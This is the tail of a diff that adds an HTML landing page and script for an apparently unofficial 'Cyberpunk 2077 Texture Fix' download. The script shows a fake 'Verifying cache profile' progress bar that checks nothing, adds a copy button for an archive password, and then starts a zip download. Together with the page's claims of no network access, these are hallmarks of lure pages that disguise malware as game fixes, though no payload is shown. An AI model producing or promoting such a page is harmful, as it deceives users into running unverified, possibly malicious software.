+          <p>None of them. Unzip one folder, run the utility, done. There is no login, no installer, no updater and no telemetry вЂ” the tool never opens a network connection.</p>
+        </details>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="foot">
+  <div class="foot-grid">
+    <p class="seo">Cyberpunk 2077 Texture Fix is a small local utility for <strong>blurry textures, texture pop-in and distant LOD mush</strong> in Night City. It rebuilds the streaming cache, tunes level-of-detail distance, adjusts VRAM streaming budgets for your GPU, and keeps a timestamped backup of your settings before every change. Portable, offline, no installer and no account.</p>
+    <nav class="foot-links" aria-label="Footer navigation">
+      <a href="#download">Download</a>
+      <a href="#features">Features</a>
+      <a href="#faq">FAQ</a>
+      <a href="https://github.com/ShadowAssistantCanal/cyberpunk-2077-texture-fix" target="_blank" rel="noopener noreferrer">Repository</a>
+      <a href="https://github.com/ShadowAssistantCanal/cyberpunk-2077-texture-fix/blob/main/SECURITY.md" target="_blank" rel="noopener noreferrer">Security</a>
+    </nav>
+    <p class="legal">
+      <span class="tm">Cyberpunk 2077 is a trademark of CD PROJEKT RED; unofficial fan project, not affiliated.</span>
+      <span class="copyline">&copy; 2026 ShadowAssistantCanal. Released under the MIT License.</span>
+    </p>
+  </div>
+</footer>
+
+<script>
+(function () {
+  "use strict";
+
+  var reduce = window.matchMedia("(prefers-reduced-motion: reduce)");
+  var dl = document.getElementById("dl");
+  var dlLabel = document.getElementById("dl-label");
+  var bar = document.getElementById("bar");
+  var pct = document.getElementById("pct");
+  var progress = document.getElementById("progress");
+  var copy = document.getElementById("copy");
+  var pw = document.getElementById("pw");
+  var burger = document.getElementById("burger");
+  var menu = document.getElementById("menu");
+  var nav = document.querySelector(".nav");
+  var busy = false;
+
+  /* ---------- password copy ---------- */
+  function fallbackCopy(text) {
+    var ta = document.createElement("textarea");
+    ta.value = text;
+    ta.setAttribute("readonly", "");
+    ta.style.position = "fixed";
+    ta.style.top = "-1000px";
+    ta.style.opacity = "0";
+    document.body.appendChild(ta);
+    ta.select();
+    var ok = false;
+    try { ok = document.execCommand("copy"); } catch (err) { ok = false; }
+    document.body.removeChild(ta);
+    return ok;
+  }
+
+  if (copy && pw) {
+    copy.addEventListener("click", function () {
+      var text = pw.textContent.trim();
+      var done = function () {
+        copy.textContent = "Copied";
+        copy.classList.add("is-done");
+        window.clearTimeout(copy._t);
+        copy._t = window.setTimeout(function () {
+          copy.textContent = "Copy";
+          copy.classList.remove("is-done");
+        }, 1800);
+      };
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(done).catch(function () {
+          if (fallbackCopy(text)) { done(); }
+          else { copy.textContent = "Select"; pw.focus(); }
+        });
+      } else if (fallbackCopy(text)) {
+        done();
+      } else {
+        copy.textContent = "Select";
+        var range = document.createRange();
+        range.selectNodeContents(pw);
+        var sel = window.getSelection();
+        if (sel) { sel.removeAllRanges(); sel.addRange(range); }
+      }
+    });
+  }
+
+  /* ---------- download with progress ---------- */
+  function fireDownload() {
+    var a = document.createElement("a");
+    a.href = dl.getAttribute("href");
+    a.download = dl.getAttribute("download") || "Cyberpunk2077TextureFix.zip";
+    a.style.display = "none";
+    document.body.appendChild(a);
+    a.click();
+    window.setTimeout(function () {
+      if (a.parentNode) { a.parentNode.removeChild(a); }
+    }, 0);
+  }
+
+  function resetUI() {
+    busy = false;
+    dl.removeAttribute("aria-busy");
+    dlLabel.textContent = "Download";
+    pct.classList.remove("is-live");
+    pct.textContent = "Download started В· check your browser";
+    progress.setAttribute("aria-valuenow", "0");
+    bar.style.width = "0%";
+    window.setTimeout(function () {
+      if (!busy) {
+        pct.textContent = "Ready В· download starts after a quick check";
+      }
+    }, 4200);
+  }
+
+  function runProgress() {
+    if (busy) { return; }
+    busy = true;
+    dl.setAttribute("aria-busy", "true");
+    dlLabel.textContent = "Verifying cache profile";
+    pct.classList.add("is-live");
+
+    var duration = 1750;
+
+    if (reduce.matches) {
+      bar.style.width = "100%";
+      pct.textContent = "100%";
+      progress.setAttribute("aria-valuenow", "100");
+      fireDownload();
+      window.setTimeout(resetUI, 400);
+      return;
+    }
+
+    var start = Date.now();
+    bar.style.width = "100%"; /* CSS transition drives the visual fill */
+
+    var counter = window.setInterval(function () {
+      var t = Math.min(1, (Date.now() - start) / duration);
+      var value = Math.round(t * 100);
+      pct.textContent = value + "% В· preparing package";
+      progress.setAttribute("aria-valuenow", String(value));
+      if (t >= 1) {
+        window.clearInterval(counter);
+      }
+    }, 50);
+
+    window.setTimeout(function () {
+      window.clearInterval(counter);
+      pct.textContent = "100% В· starting download";
+      progress.setAttribute("aria-valuenow", "100");
+      fireDownload();
+      window.setTimeout(resetUI, 900);
+    }, duration + 60);
+  }
+
+  if (dl && bar && pct && progress) {
+    dl.addEventListener("click", function (event) {
+      event.preventDefault();
+      runProgress();
+    });
+  }
+
+  /* ---------- scroll reveal ---------- */
+  var items = document.querySelectorAll(".reveal");
+  if ("IntersectionObserver" in window && !reduce.matches) {
+    var io = new IntersectionObserver(function (entries) {
+      entries.forEach(function (entry) {
+        if (entry.isIntersecting) {
+          entry.target.classList.add("in");
+          io.unobserve(entry.target);
+        }
+      });
+    }, { threshold: 0.12, rootMargin: "0px 0px -60px 0px" });
+    items.forEach(function (el) { io.observe(el); });
+  } else {
+    items.forEach(function (el) { el.classList.add("in"); });
+  }
+
+  /* ---------- sticky nav state ---------- */
+  var lastState = false;
+  function onScroll() {
+    var scrolled = window.scrollY > 12;
+    if (scrolled !== lastState) {
+      lastState = scrolled;
+      nav.classList.toggle("is-scrolled", scrolled);
+    }
+  }
+  if (nav) {
+    window.addEventListener("scroll", onScroll, { passive: true });
+    onScroll();
+  }
+
+  /* ---------- burger menu ---------- */
+  function setMenu(open) {
+    burger.setAttribute("aria-expanded", open ? "true" : "false");
+    burger.setAttribute("aria-label", open ? "Close navigation menu" : "Open navigation menu");
+    menu.classList.toggle("is-open", open);
+  }
+
+  if (burger && menu) {
+    burger.addEventListener("click", function () {
+      setMenu(burger.getAttribute("aria-expanded") !== "true");
+    });
+    menu.addEventListener("click", function (event) {
+      if (event.target.closest("a")) { setMenu(false); }
+    });
+    document.addEventListener("keydown", function (event) {
+      if (event.key === "Escape" && burger.getAttribute("aria-expanded") === "true") {
+        setMenu(false);
+        burger.focus();
+      }
+    });
+    document.addEventListener("click", function (event) {
+      if (burger.getAttribute("aria-expanded") !== "true") { return; }
+      if (!menu.contains(event.target) && !burger.contains(event.target)) { setMenu(false); }
+    });
+    window.addEventListener("resize", function () {
+      if (window.innerWidth > 760) { setMenu(false); }
+    });
+  }
+})();
+</script>
+</body>
+</html>
